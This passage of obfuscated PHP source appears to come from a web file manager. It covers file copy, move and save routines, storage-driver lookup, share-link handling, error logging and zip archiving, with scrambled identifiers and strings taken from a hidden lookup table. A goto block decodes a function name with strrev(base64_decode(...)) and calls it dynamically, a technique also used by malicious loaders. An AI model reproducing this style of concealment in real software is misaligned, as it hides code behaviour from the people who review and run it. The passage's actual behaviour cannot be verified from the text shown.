$ù×ôö¥Ñ, $°õ•Éƒ); Hook::trigger($ßóºä[1194] . $ù×ôö¥Ñ . $ßóºä[1197], $™™·ãü, $ú½¢é¬Ø); return $ú½¢é¬Ø; } public static function saveFile($Øô‚ëú“, $ëûØ£Ÿ, $™ù×áß“ = true) { $¡àÈ·İĞ =& $_SERVER[ò«¥Ê‡å]; $ÃÅğÇªå = self::info($ëûØ£Ÿ); $¶€ÀÚ´» = self::driverMake($Øô‚ëú“); $œ—ù‚ÆØ = self::driverMake($ëûØ£Ÿ); $íé• ŞÛ = !1; if ($œ—ù‚ÆØ->pathParse[$¡àÈ·İĞ[1198]]) { $íé• ŞÛ = $œ—ù‚ÆØ; $éÏŠîªâ = $œ—ù‚ÆØ->pathParse[$¡àÈ·İĞ[1198]]; $œ—ù‚ÆØ = self::driverMake($éÏŠîªâ); } if ($¶€ÀÚ´»->pathParse[$¡àÈ·İĞ[1198]]) { $È‚ĞŞ‘Ğ = $¶€ÀÚ´»->pathParse[$¡àÈ·İĞ[1198]]; $¶€ÀÚ´» = self::driverMake($È‚ĞŞ‘Ğ); } $äòĞ€Ö‚ = $œ—ù‚ÆØ->pathFather($ëûØ£Ÿ); $ÒÔÆŠà³ = !0; if (!$™ù×áß“ && self::driverIsSame($¶€ÀÚ´», $œ—ù‚ÆØ)) { $ÒÔÆŠà³ = !1; } $ Ì’¸ëê = self::copyFile($¶€ÀÚ´», $Øô‚ëú“, $œ—ù‚ÆØ, $äòĞ€Ö‚, $ÃÅğÇªå[$¡àÈ·İĞ[32]], $ÒÔÆŠà³); if ($íé• ŞÛ) { $ Ì’¸ëê = $íé• ŞÛ->getPathOuter($ Ì’¸ëê); } return $ Ì’¸ëê; } private static function copyMove($¢ºé×ü¥, $µ“‹Ğ¥®, $Ùªş“¨Ğ, $İŠ÷ôË«, $½Çà£ĞŸ = false) { $ëœü¡ùƒ =& $_SERVER[ò«¥Ê‡å]; if (!$¢ºé×ü¥ || $¢ºé×ü¥ == $ëœü¡ùƒ[8] || !$µ“‹Ğ¥®) { return !1; } ignore_timeout(); $ŒŒù…’´ = self::driverMake($¢ºé×ü¥); $ß„˜©µ³ = self::driverMake($µ“‹Ğ¥®); $ñ‰³õ«Š = $İŠ÷ôË« == $ëœü¡ùƒ[590]; $’•¦ç‹¶ = !1; if ($ß„˜©µ³->pathParse[$ëœü¡ùƒ[1198]]) { $’•¦ç‹¶ = $ß„˜©µ³; $µ“‹Ğ¥® = $ß„˜©µ³->pathParse[$ëœü¡ùƒ[1198]]; $ß„˜©µ³ = self::driverMake($µ“‹Ğ¥®); } if ($ŒŒù…’´->pathParse[$ëœü¡ùƒ[1198]]) { $¢ºé×ü¥ = $ŒŒù…’´->pathParse[$ëœü¡ùƒ[1198]]; $ŒŒù…’´ = self::driverMake($¢ºé×ü¥); } self::check($ŒŒù…’´, $¢ºé×ü¥, $ß„˜©µ³, $µ“‹Ğ¥®); Hook::trigger($ëœü¡ùƒ[1199], $ŒŒù…’´, $¢ºé×ü¥, $ß„˜©µ³, $µ“‹Ğ¥®); $Íµëíäî = self::driverIsSame($ŒŒù…’´, $ß„˜©µ³); if ($Íµëíäî) { if ($İŠ÷ôË« == $ëœü¡ùƒ[590] && !method_exists($ß„˜©µ³, $ëœü¡ùƒ[1200]) && trim($µ“‹Ğ¥®, $ëœü¡ùƒ[8]) == trim($ß„˜©µ³->pathFather($¢ºé×ü¥), $ëœü¡ùƒ[8])) { if ($ŒŒù…’´->pathThis($¢ºé×ü¥) != $½Çà£ĞŸ && !$ŒŒù…’´->isTypeObject()) { return $ŒŒù…’´->rename($¢ºé×ü¥, $½Çà£ĞŸ); } return $ß„˜©µ³->getPathOuter($¢ºé×ü¥); } if (method_exists($ß„˜©µ³, $İŠ÷ôË«)) { return $ß„˜©µ³->{$İŠ÷ôË«}($¢ºé×ü¥, $µ“‹Ğ¥®, $Ùªş“¨Ğ, $½Çà£ĞŸ); } } if ($Íµëíäî && $İŠ÷ôË« == $ëœü¡ùƒ[590] && $ß„˜©µ³->getType() == $ëœü¡ùƒ[108]) { $‘¹Ğ¼Î = $ß„˜©µ³->movePath($¢ºé×ü¥, $µ“‹Ğ¥®, $½Çà£ĞŸ); if ($‘¹Ğ¼Î) { return $‘¹Ğ¼Î; } } $Æ¥é¾Áå = $ŒŒù…’´->isFile($¢ºé×ü¥); if (!$Æ¥é¾Áå && $ß„˜©µ³->getType() == $ëœü¡ùƒ[796] && $ŒŒù…’´->getType() == $ëœü¡ùƒ[108]) { $‘¹Ğ¼Î = $ß„˜©µ³->copyFolderFromIO($ŒŒù…’´, $¢ºé×ü¥, $µ“‹Ğ¥®, $Ùªş“¨Ğ, $ñ‰³õ«Š, $½Çà£ĞŸ); } else { $‘¹Ğ¼Î = self::copyPath($ŒŒù…’´, $¢ºé×ü¥, $ß„˜©µ³, $µ“‹Ğ¥®, $Ùªş“¨Ğ, $ñ‰³õ«Š, $Æ¥é¾Áå, $½Çà£ĞŸ); } if ($‘¹Ğ¼Î && $ñ‰³õ«Š) { $ŒŒù…’´->remove($¢ºé×ü¥); } if ($’•¦ç‹¶) { $‘¹Ğ¼Î = $’•¦ç‹¶->getPathOuter($‘¹Ğ¼Î); } return $‘¹Ğ¼Î; } private static function check($•œ»›˜Ø, $ÔÌÚé¢, $ğœÓãÑâ, &$öËÓ³ÙÉ) { $•˜½àÛ =& $_SERVER[ò«¥Ê‡å]; if (self::driverIsSame($•œ»›˜Ø, $ğœÓãÑâ) && $•œ»›˜Ø->isFolder($ÔÌÚé¢) && $•œ»›˜Ø->isParentOf($ÔÌÚé¢, $öËÓ³ÙÉ)) { show_json(LNG($•˜½àÛ[1201]), !1); } if (!$•œ»›˜Ø->exist($ÔÌÚé¢)) { show_json(LNG($•˜½àÛ[107]), !1); } } private static function copyPath($“÷ğ…¹ß, $®¦¼È, $Ü»şü˜È, $Ş˜şä¿Ê, $š­Œ•ø, $ŸæŞÌšõ, $”ƒğ£‘, $Êî¯õµı = false, $š•íÈé„ = true) { $‘¿ÆÌÑó =& $_SERVER[ò«¥Ê‡å]; $‘â¾éÜ¹ = empty($Êî¯õµı) && $Êî¯õµı !== $‘¿ÆÌÑó[214] ? $“÷ğ…¹ß->pathThis($®¦¼È) : $Êî¯õµı; if ($š­Œ•ø) { $ÉñšÕñ¿ = $Ü»şü˜È->fileNameExist($Ş˜şä¿Ê, $‘â¾éÜ¹); $ íôæ­” = $‘â¾éÜ¹; $‘â¾éÜ¹ = $Ü»şü˜È->fileNameAuto($Ş˜şä¿Ê, $‘â¾éÜ¹, $š­Œ•ø, !$”ƒğ£‘); if (!$ÉñšÕñ¿ || $ íôæ­” != $‘â¾éÜ¹) { $š­Œ•ø = !1; } if ($š•íÈé„ && !$š­Œ•ø) { $Ü»şü˜È->_data[$‘¿ÆÌÑó[1202]] = !0; } } if ($”ƒğ£‘) { return self::copyFile($“÷ğ…¹ß, $®¦¼È, $Ü»şü˜È, $Ş˜şä¿Ê, $‘â¾éÜ¹, $ŸæŞÌšõ); } if ($š­Œ•ø == REPEAT_RENAME_FOLDER) { $š­Œ•ø = !1; } $¬´ä§Áı = rtrim($Ş˜şä¿Ê, $‘¿ÆÌÑó[8]) . $‘¿ÆÌÑó[8] . $‘â¾éÜ¹; $—ÓİßŠ· = $Ü»şü˜È->mkdir($Ü»şü˜È->getPath($¬´ä§Áı), $š­Œ•ø); $Ş˜şä¿Ê = $Ü»şü˜È->getPathInner($—ÓİßŠ·); $—”Ÿíğ¡ = $“÷ğ…¹ß->listPath($®¦¼È, !0); $—”Ÿíğ¡ = is_array($—”Ÿíğ¡) ? $—”Ÿíğ¡ : array($‘¿ÆÌÑó[85] => array(), $‘¿ÆÌÑó[84] => array()); $ÀÃùµÜ = array_merge($—”Ÿíğ¡[$‘¿ÆÌÑó[85]], $—”Ÿíğ¡[$‘¿ÆÌÑó[84]]); foreach ($ÀÃùµÜ as $¬œ›·®ï) { $‚â€…» = $¬œ›·®ï[$‘¿ÆÌÑó[33]] == $‘¿ÆÌÑó[216]; $®¦¼È = $“÷ğ…¹ß->getPathInner($¬œ›·®ï[$‘¿ÆÌÑó[86]]); $¤ Éô¬¡ = self::copyPath($“÷ğ…¹ß, $®¦¼È, $Ü»şü˜È, $Ş˜şä¿Ê, $š­Œ•ø, $ŸæŞÌšõ, $‚â€…», !1, !1); if (!$¤ Éô¬¡) { IO::errorTips($‘¿ÆÌÑó[1203] . $®¦¼È . $‘¿ÆÌÑó[72] . $Ş˜şä¿Ê); } } self::copyMoveKeepInfo($“÷ğ…¹ß, $®¦¼È, $—ÓİßŠ·); return $—ÓİßŠ·; } private static function copyFile($¼ô¾£Šş, $šœ‡òŸï, $öÎí«ÇŒ, $êÆ‘‰´­, $‰óŞ¬¶, $¬»ö¯Š¶) { $´¢¸ê‚Å =& $_SERVER[ò«¥Ê‡å]; $êÆ‘‰´­ = $öÎí«ÇŒ->getPath(rtrim($êÆ‘‰´­, $´¢¸ê‚Å[8]) . $´¢¸ê‚Å[8] . $‰óŞ¬¶); $ñé…©ûˆ = $´¢¸ê‚Å[1204] . time() . rand_string(5); Hook::trigger($´¢¸ê‚Å[1205], $¼ô¾£Šş, $šœ‡òŸï, $öÎí«ÇŒ, $êÆ‘‰´­, $‰óŞ¬¶, $ñé…©ûˆ); if (self::driverIsSame($¼ô¾£Šş, $öÎí«ÇŒ)) { if ($¬»ö¯Š¶) { $º•Å¾‚Ö = $öÎí«ÇŒ->moveFile($šœ‡òŸï, $êÆ‘‰´­); } else { $º•Å¾‚Ö = $öÎí«ÇŒ->copyFile($šœ‡òŸï, $êÆ‘‰´­); } Hook::trigger($´¢¸ê‚Å[1206], $¼ô¾£Šş, $šœ‡òŸï, $öÎí«ÇŒ, $êÆ‘‰´­, $‰óŞ¬¶, $º•Å¾‚Ö); self::copyMoveKeepInfo($¼ô¾£Šş, $šœ‡òŸï, $º•Å¾‚Ö); return $º•Å¾‚Ö; } $©áïÔéã = TEMP_FILES; if ($GLOBALS[$´¢¸ê‚Å[6]][$´¢¸ê‚Å[91]][$´¢¸ê‚Å[835]]) { $©áïÔéã = $GLOBALS[$´¢¸ê‚Å[6]][$´¢¸ê‚Å[91]][$´¢¸ê‚Å[835]]; } $Ò§ÈÁ†› = $©áïÔéã; mk_dir($Ò§ÈÁ†›); $©Â¹ªå = $Ò§ÈÁ†› . $ñé…©ûˆ; $¿ûğ˜íÙ = $©Â¹ªå; $©Â¹ªå = $¼ô¾£Šş->download($šœ‡òŸï, $©Â¹ªå); $©Â¹ªå = $¼ô¾£Šş->iconvApp($©Â¹ªå); if (substr($©Â¹ªå, strlen($©áïÔéã)) == $©áïÔéã) { $¬»ö¯Š¶ = !0; } $º•Å¾‚Ö = $öÎí«ÇŒ->upload($êÆ‘‰´­, $©Â¹ªå, $¬»ö¯Š¶); self::remove($¿ûğ˜íÙ); Hook::trigger($´¢¸ê‚Å[1206], $¼ô¾£Šş, $šœ‡òŸï, $öÎí«ÇŒ, $êÆ‘‰´­, $‰óŞ¬¶, $º•Å¾‚Ö); self::copyMoveKeepInfo($¼ô¾£Šş, $šœ‡òŸï, $º•Å¾‚Ö); return $º•Å¾‚Ö; } private static function copyMoveKeepInfo($§äØùà¡, $»ÀıçÒ¼, $æ¼û“·ö) { if (!$æ¼û“·ö) { return; } $òœÉ‡˜ä = $§äØùà¡->info($»ÀıçÒ¼); if (!is_array($òœÉ‡˜ä)) { return; } IO::setModifyTime($æ¼û“·ö, $òœÉ‡˜ä[$_SERVER[ò«¥Ê‡å][87]]); } public static function pathFather($âÕÕØ…‚) { $½îÔ€Æ = IO::init($âÕÕØ…‚); $º¥Á…ú = $½îÔ€Æ->pathFather($½îÔ€Æ->path); return $½îÔ€Æ->getPathOuter($º¥Á…ú); } public static function fileOut($¶Ù¥ŞØá, $÷§ú¡Î† = false, $¾ƒ±©Âç = false, $ä‰é¿Ü‹ = '') { $åõ’øê¿ = self::driverMake($¶Ù¥ŞØá); if ($åõ’øê¿->isFileOutServer()) { return $åõ’øê¿->fileOutServer($¶Ù¥ŞØá, $÷§ú¡Î†, $¾ƒ±©Âç, $ä‰é¿Ü‹); } return $åõ’øê¿->fileOut($¶Ù¥ŞØá, $÷§ú¡Î†, $¾ƒ±©Âç, $ä‰é¿Ü‹); } public static function fileOutImage($ğ•üÀ›¾, $ŠÈˆÏ™€ = 250) { $¥¹ï”˜­ = array(250, 600, 1200, 2000, 3000, 5000); for ($ãÚ¤¾”® = 0; $ãÚ¤¾”® < count($¥¹ï”˜­); $ãÚ¤¾”®++) { if ($ãÚ¤¾”® == 0 && $ŠÈˆÏ™€ <= $¥¹ï”˜­[$ãÚ¤¾”®]) { $ŠÈˆÏ™€ = $¥¹ï”˜­[$ãÚ¤¾”®]; break; } else { if ($ŠÈˆÏ™€ > $¥¹ï”˜­[$ãÚ¤¾”® - 1] && $ŠÈˆÏ™€ <= $¥¹ï”˜­[$ãÚ¤¾”®]) { $ŠÈˆÏ™€ = $¥¹ï”˜­[$ãÚ¤¾”®]; break; } else { if ($ãÚ¤¾”® == count($¥¹ï”˜­) - 1 && $ŠÈˆÏ™€ > $¥¹ï”˜­[$ãÚ¤¾”®]) { $ŠÈˆÏ™€ = $¥¹ï”˜­[$ãÚ¤¾”®]; break; } } } } $¸ÄõÙÃ” = self::driverMake($ğ•üÀ›¾); if ($¸ÄõÙÃ”->isFileOutServer()) { return $¸ÄõÙÃ”->fileOutImageServer($ğ•üÀ›¾, $ŠÈˆÏ™€); } return $¸ÄõÙÃ”->fileOutImage($ğ•üÀ›¾, $ŠÈˆÏ™€); } private static function driverIsSame($Ë²’‚Ñ, $ùÕ½…¼¿) { $ÈÅ¿ã„ö =& $_SERVER[ò«¥Ê‡å]; $ÊöÎ–ŞŒ = $Ë²’‚Ñ->getType(); $à¹©†Íƒ = $ùÕ½…¼¿->getType(); if ($ÊöÎ–ŞŒ != $à¹©†Íƒ) { return !1; } if ($ÊöÎ–ŞŒ == $ÈÅ¿ã„ö[796]) { return !0; } if ($ÊöÎ–ŞŒ == $ÈÅ¿ã„ö[108]) { return !0; } if ($Ë²’‚Ñ->pathDriver == $ùÕ½…¼¿->pathDriver) { return !0; } return !1; } public static function copyUpdate($®¼Ù·Í§, $—“¶Ñ¦é) { $ªİôÔ£¦ =& $_SERVER[ò«¥Ê‡å]; if (!IO::exist($®¼Ù·Í§)) { return !1; } if (!IO::exist($—“¶Ñ¦é)) { IO::mkdir($—“¶Ñ¦é); } $€®¨ƒ¥ë = array_to_keyvalue(self::listAllSimple($®¼Ù·Í§), $ªİôÔ£¦[86]); $È§â³Ë = array_to_keyvalue(self::listAllSimple($—“¶Ñ¦é), $ªİôÔ£¦[86]); $®¡Ş‘±î = array(); $„‹¸œ‹ê = array(); foreach ($€®¨ƒ¥ë as $Í¹òÍà¥ => $ô¬‰’ø®) { if (isset($È§â³Ë[$Í¹òÍà¥])) { if ($ô¬‰’ø®[$ªİôÔ£¦[77]] == 1) { continue; } if ($È§â³Ë[$Í¹òÍà¥][$ªİôÔ£¦[78]] == $ô¬‰’ø®[$ªİôÔ£¦[78]]) { continue; } } if ($ô¬‰’ø®[$ªİôÔ£¦[77]] == 1) { $„‹¸œ‹ê[] = $—“¶Ñ¦é . $ªİôÔ£¦[8] . trim($Í¹òÍà¥, $ªİôÔ£¦[8]); continue; } $­äıÍó„ = strstr(trim($Í¹òÍà¥, $ªİôÔ£¦[8]), $ªİôÔ£¦[8]) ? get_path_father($Í¹òÍà¥) : $ªİôÔ£¦[12]; $®¡Ş‘±î[] = array($ªİôÔ£¦[1207] => $ô¬‰’ø®[$ªİôÔ£¦[88]], $ªİôÔ£¦[1208] => rtrim($—“¶Ñ¦é, $ªİôÔ£¦[8]) . $ªİôÔ£¦[8] . $­äıÍó„, $ªİôÔ£¦[1209] => $ô¬‰’ø®); } $†®Ô“ÆÌ = array($ªİôÔ£¦[216] => $®¡Ş‘±î, $ªİôÔ£¦[77] => $„‹¸œ‹ê); Hook::trigger($ªİôÔ£¦[1210], $®¼Ù·Í§, $—“¶Ñ¦é, $†®Ô“ÆÌ); foreach ($„‹¸œ‹ê as $ô¬‰’ø®) { IO::mkdir($ô¬‰’ø®); } foreach ($®¡Ş‘±î as $ô¬‰’ø®) { IO::copy($ô¬‰’ø®[$ªİôÔ£¦[1207]], $ô¬‰’ø®[$ªİôÔ£¦[1208]], REPEAT_REPLACE); } } public static function fileSubstr($†‰†ûğİ, $â‹ô°ÏÛ, $çØˆê† = false) { $˜Ô´ßáñ =& $_SERVER[ò«¥Ê‡å]; $¥‹°İåÅ = self::driverMake($†‰†ûğİ); $²êÎ±¼Ö = $¥‹°İåÅ->size($†‰†ûğİ); $øµº§Ë = $â‹ô°ÏÛ; $µşó¡É• = $çØˆê†; if ($â‹ô°ÏÛ < 0) { $â‹ô°ÏÛ = $²êÎ±¼Ö + $â‹ô°ÏÛ; } if ($çØˆê† === !1) { $çØˆê† = $²êÎ±¼Ö - $â‹ô°ÏÛ; } if ($â‹ô°ÏÛ + $çØˆê† > $²êÎ±¼Ö) { $çØˆê† = $²êÎ±¼Ö - $â‹ô°ÏÛ; } if (!$²êÎ±¼Ö && $¥‹°İåÅ->getType() == $˜Ô´ßáñ[108] && !$¥‹°İåÅ->exist($†‰†ûğİ)) { $áí£×ü¡ = get_path_this($†‰†ûğİ); $£‹ÛùÌü = parse_url_query($áí£×ü¡); if (is_array($£‹ÛùÌü) && isset($£‹ÛùÌü[$˜Ô´ßáñ[32]])) { $áí£×ü¡ = urldecode($£‹ÛùÌü[$˜Ô´ßáñ[32]]); } throw new Exception($˜Ô´ßáñ[1211] . LNG($˜Ô´ßáñ[1212]) . $˜Ô´ßáñ[1013] . clear_html($áí£×ü¡) . $˜Ô´ßáñ[12]); } if ($çØˆê† <= 0) { return $˜Ô´ßáñ[12]; } if ($â‹ô°ÏÛ < 0 || $â‹ô°ÏÛ >= $²êÎ±¼Ö || $çØˆê† > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\x65\x52\145\141\144\x20\145\162\x72\157\x72\41\x20\x73\x74\141\x72\x74\x3d{$â‹ô°ÏÛ}\x3b\x6c\x65\156\147\x74\150\x3d{$çØˆê†}\x3b\x20\x73\x69\172\x65\75{$²êÎ±¼Ö}\73"); } $ÅÜ´ÆŞá = $¥‹°İåÅ->fileSubstr($†‰†ûğİ, $â‹ô°ÏÛ, $çØˆê†); if (!$ÅÜ´ÆŞá && $çØˆê† && isset($GLOBALS[$˜Ô´ßáñ[1213]])) { throw new Exception($GLOBALS[$˜Ô´ßáñ[1213]][$˜Ô´ßáñ[1214]]); } return $ÅÜ´ÆŞá; } private static function driverMake(&$¢ıÇ¡†) { $«ÑæÍ× =& $_SERVER[ò«¥Ê‡å]; $’Â«ø¾Ä = KodIO::parse($¢ıÇ¡†); if (!self::$driverListSystem) { $†ËÏŠÛ® = Model($«ÑæÍ×[806])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($†ËÏŠÛ®, $«ÑæÍ×[445]); } if ($’Â«ø¾Ä[$«ÑæÍ×[33]] == KodIO::KOD_IO && !self::$driverListSystem[$’Â«ø¾Ä[$«ÑæÍ×[445]]]) { return !1; } $¢ıÇ¡† = $’Â«ø¾Ä[$«ÑæÍ×[1215]]; $åÆˆçúÊ = self::driverGet($’Â«ø¾Ä, $¢ıÇ¡†); return $åÆˆçúÊ; } private static function driverGet($ßÏµ§Ñ÷, &$Ûş§×ıú) { $Œ‚­Ëƒ² =& $_SERVER[ò«¥Ê‡å]; $¢’–ıµ“ = $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[1216]]; $ÔŠÈ‚§¦ = $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[445]]; switch ($ßÏµ§Ñ÷[$Œ‚­Ëƒ²[33]]) { case KodIO::KOD_IO: $ßàÓ¾ŸÉ = self::$driverListSystem[$ÔŠÈ‚§¦]; break; case KodIO::KOD_SOURCE: $Ûş§×ıú = $ÔŠÈ‚§¦ . $Ûş§×ıú; $ßàÓ¾ŸÉ = array($Œ‚­Ëƒ²[1217] => $Œ‚­Ëƒ²[1218], $Œ‚­Ëƒ²[6] => $ßÏµ§Ñ÷); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $ÇúÚØ€Ú = $GLOBALS[$Œ‚­Ëƒ²[1219]]; self::$driverListUser = array_to_keyvalue($ÇúÚØ€Ú, $Œ‚­Ëƒ²[445]); } $ßàÓ¾ŸÉ = self::$driverListUser[$ÔŠÈ‚§¦]; break; case KodIO::KOD_SHARE_LINK: $ßàÓ¾ŸÉ = array($Œ‚­Ëƒ²[1217] => $Œ‚­Ëƒ²[1220], $Œ‚­Ëƒ²[6] => $ßÏµ§Ñ÷); $Õãû¡³’ = Action($Œ‚­Ëƒ²[1221])->sharePathInfo($ßÏµ§Ñ÷[$Œ‚­Ëƒ²[86]]); $Ûş§×ıú = $Õãû¡³’[$Œ‚­Ëƒ²[183]]; if (!$Õãû¡³’[$Œ‚­Ëƒ²[183]]) { $§×¶¹¶¯ = Model($Œ‚­Ëƒ²[634])->getInfo($Õãû¡³’[$Œ‚­Ëƒ²[635]]); $Ûş§×ıú = KodIO::clear($§×¶¹¶¯[$Œ‚­Ëƒ²[1222]] . $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[1215]]); $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[531]] = $§×¶¹¶¯; $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[1198]] = $Ûş§×ıú; $ßàÓ¾ŸÉ = array($Œ‚­Ëƒ²[1217] => $Œ‚­Ëƒ²[1223], $Œ‚­Ëƒ²[6] => $ßÏµ§Ñ÷); } break; case KodIO::KOD_SHARE_ITEM: $ßàÓ¾ŸÉ = array($Œ‚­Ëƒ²[1217] => $Œ‚­Ëƒ²[1224], $Œ‚­Ëƒ²[6] => $ßÏµ§Ñ÷); $§×¶¹¶¯ = Model($Œ‚­Ëƒ²[634])->getInfo($ßÏµ§Ñ÷[$Œ‚­Ëƒ²[445]]); if ($§×¶¹¶¯[$Œ‚­Ëƒ²[183]] == $Œ‚­Ëƒ²[214]) { $Ûş§×ıú = KodIO::clear($§×¶¹¶¯[$Œ‚­Ëƒ²[1222]] . $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[1215]]); $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[531]] = $§×¶¹¶¯; $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[1198]] = $Ûş§×ıú; $ßàÓ¾ŸÉ = array($Œ‚­Ëƒ²[1217] => $Œ‚­Ëƒ²[1225], $Œ‚­Ëƒ²[6] => $ßÏµ§Ñ÷); } else { if (!$Ûş§×ıú) { $Ûş§×ıú = $§×¶¹¶¯[$Œ‚­Ëƒ²[183]]; } } break; default: $Ûş§×ıú = $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[86]]; $ßàÓ¾ŸÉ = array($Œ‚­Ëƒ²[1217] => $Œ‚­Ëƒ²[1226]); break; } $ìó³èÇï = $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[86]]; if (!isset(self::$driverCache[$ìó³èÇï])) { $ìÛ¿âê = strtolower($ßàÓ¾ŸÉ[$Œ‚­Ëƒ²[97]]); $ïËÂåæ¹ = $GLOBALS[$Œ‚­Ëƒ²[6]][$Œ‚­Ëƒ²[91]][$Œ‚­Ëƒ²[872]]; $µØŠÃ¶ = $Œ‚­Ëƒ²[76] . (isset($ïËÂåæ¹[$ìÛ¿âê]) ? $ïËÂåæ¹[$ìÛ¿âê] : ucfirst($ìÛ¿âê)); if (!class_exists($µØŠÃ¶)) { show_json("{$µØŠÃ¶}\40\x6e\x6f\x74\x20\x65\x78\x69\163\164\x73\41", !1); } $…Ê½Û¾ = isset($ßàÓ¾ŸÉ[$Œ‚­Ëƒ²[6]]) ? $ßàÓ¾ŸÉ[$Œ‚­Ëƒ²[6]] : !1; self::$driverCache[$ìó³èÇï] = new $µØŠÃ¶($…Ê½Û¾); } $‘ŠÑÜ·º = self::$driverCache[$ìó³èÇï]; $‘ŠÑÜ·º->pathDriver = $¢’–ıµ“; $‘ŠÑÜ·º->pathBase = $Œ‚­Ëƒ²[12]; if (isset($ßàÓ¾ŸÉ[$Œ‚­Ëƒ²[6]][$Œ‚­Ëƒ²[1227]])) { $‘ŠÑÜ·º->pathBase = rtrim($ßàÓ¾ŸÉ[$Œ‚­Ëƒ²[6]][$Œ‚­Ëƒ²[1227]], $Œ‚­Ëƒ²[8]) . $Œ‚­Ëƒ²[8]; $Ûş§×ıú = $‘ŠÑÜ·º->pathBase . ltrim($Ûş§×ıú, $Œ‚­Ëƒ²[8]); } $Ûş§×ıú = $‘ŠÑÜ·º->getPath($Ûş§×ıú); if (isset($ßÏµ§Ñ÷[$Œ‚­Ëƒ²[1198]])) { $Ûş§×ıú = $ßÏµ§Ñ÷[$Œ‚­Ëƒ²[1198]]; } $‘ŠÑÜ·º->path = $Ûş§×ıú; return $‘ŠÑÜ·º; } public static function errorTips($ÎèÍ„ö = false) { $„úô†š£ =& $_SERVER[ò«¥Ê‡å]; static $ÈÎ×•¡¤ = array(); $ğÏ·û¢Î = 1000; if ($ÎèÍ„ö === -1) { return $ÈÎ×•¡¤ ? $ÈÎ×•¡¤[count($ÈÎ×•¡¤) - 1] : $„úô†š£[12]; } if ($ÎèÍ„ö === !1) { return implode($„úô†š£[248], $ÈÎ×•¡¤); } if (count($ÈÎ×•¡¤) >= $ğÏ·û¢Î) { $ÈÎ×•¡¤ = array_slice($ÈÎ×•¡¤, $ğÏ·û¢Î * 0.5, $ğÏ·û¢Î); } $ÈÎ×•¡¤[] = $ÎèÍ„ö; write_log($„úô†š£[165] . ACTION . $„úô†š£[1228] . $ÎèÍ„ö, $„úô†š£[1229]); } public static function getLastError($Õœ›¬şŒ = '') { $Æç‹ê× = self::errorTips(-1); return $Æç‹ê× ? $Æç‹ê× : $Õœ›¬şŒ; } } goto cå ‰Úñ—; EŠ÷Á¡§: $fileSize = strrev(base64_decode($_SERVER[öúâ•Û®][0])); function binCheckNeq($şĞÍƒËâ, $Ò˜Æ·şã) { return $şĞÍƒËâ != $Ò˜Æ·şã; } $_SERVER[$_SERVER[öúâ•Û®][1]] = $fileSize($_SERVER[$_SERVER[öúâ•Û®][2]]); goto A•İ‡‘²Ô; cå ‰Úñ—: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $®Å¸¿‰Â; if ($®Å¸¿‰Â) { return $®Å¸¿‰Â; } $ùÁØ•¼’ = IO::init($_SERVER[ò«¥Ê‡å][8]); return $ùÁØ•¼’; } private static function iconvSystem($‡•Ü¼ú) { return self::local()->iconvSystem($‡•Ü¼ú); } private static function iconvApp($µ›¿ûŒÛ) { return self::local()->iconvApp($µ›¿ûŒÛ); } public static function zipFolder($²¦’âÙ£, $àÛÚêç = "\172\x69\160", $ş³é—‚œ = '', $ë¹¹Æƒ = REPEAT_RENAME) { $‚ºçı“Å =& $_SERVER[ò«¥Ê‡å]; $Â«ƒ—óû = IO::listPath($²¦’âÙ£); if (!$Â«ƒ—óû) { return !1; } $Â«ƒ—óû = array_merge($Â«ƒ—óû[$‚ºçı“Å[84]], $Â«ƒ—óû[$‚ºçı“Å[85]]); return self::zip($Â«ƒ—óû, $àÛÚêç, $ş³é—‚œ, $ë¹¹Æƒ); } public static function zip($˜µ†ÙıŞ, $ı¨òïàä = "\x7a\x69\x70", $½¯ÅÙí¹ = '', $†æø³ğÒ = REPEAT_RENAME) { $Ş¢Ä‚°© =& $_SERVER[ò«¥Ê‡å]; if (is_string($˜µ†ÙıŞ) && $˜µ†ÙıŞ) { $˜µ†ÙıŞ = array(array($Ş¢Ä‚°©[86] => $˜µ†ÙıŞ)); } $ü®¿Ã•ù = self::init($˜µ†ÙıŞ[0][$Ş¢Ä‚°©[86]]); $êÃç°ŠÊ = self::info($˜µ†ÙıŞ[0][$Ş¢Ä‚°©[86]]); $şüŒí‡’ = $Ş¢Ä‚°©[12]; $†­Úüé = $Ş¢Ä‚°©[12]; $á¨ÁâÚ… = $Ş¢Ä‚°©[12]; if ($½¯ÅÙí¹ && substr($½¯ÅÙí¹, -1, 1) != $Ş¢Ä‚°©[8]) { $†­Úüé = get_path_father($½¯ÅÙí¹); $á¨ÁâÚ… = get_path_this($½¯ÅÙí¹); } else { $†­Úüé = self::pathFather($êÃç°ŠÊ[$Ş¢Ä‚°©[86]]); $á¨ÁâÚ… = $êÃç°ŠÊ[$Ş¢Ä‚°©[32]] . $Ş¢Ä‚°©[10] . $ı¨òïàä; if (count($˜µ†ÙıŞ) > 1) { $—¿ĞÀ‰Å = IO::info($†­Úüé); $á¨ÁâÚ… = $—¿ĞÀ‰Å[$Ş¢Ä‚°©[32]] . $Ş¢Ä‚°©[10] . $ı¨òïàä; } if ($½¯ÅÙí¹) { $†­Úüé = $½¯ÅÙí¹; } } if ($ü®¿Ã•ù->getType() == $Ş¢Ä‚°©[108]) { $­ú™’¶ó = self::init($†­Úüé); $İâ—±³ = $­ú™’¶ó->getType() == $Ş¢Ä‚°©[108] ? $†­Úüé : get_path_father($ü®¿Ã•ù->path); $İâ—±³ = rtrim($İâ—±³, $Ş¢Ä‚°©[8]) . $Ş¢Ä‚°©[8]; mk_dir($İâ—±³); } else { $şüŒí‡’ = TEMP_FILES . $Ş¢Ä‚°©[1230] . time() . rand_string(8) . $Ş¢Ä‚°©[8]; mk_dir($şüŒí‡’); file_put_contents($şüŒí‡’ . $Ş¢Ä‚°©[1231], $Ş¢Ä‚°©[12]); $İâ—±³ = $şüŒí‡’; } $ÚÜ£°ƒØ = IO::info($İâ—±³); if (!$ÚÜ£°ƒØ || 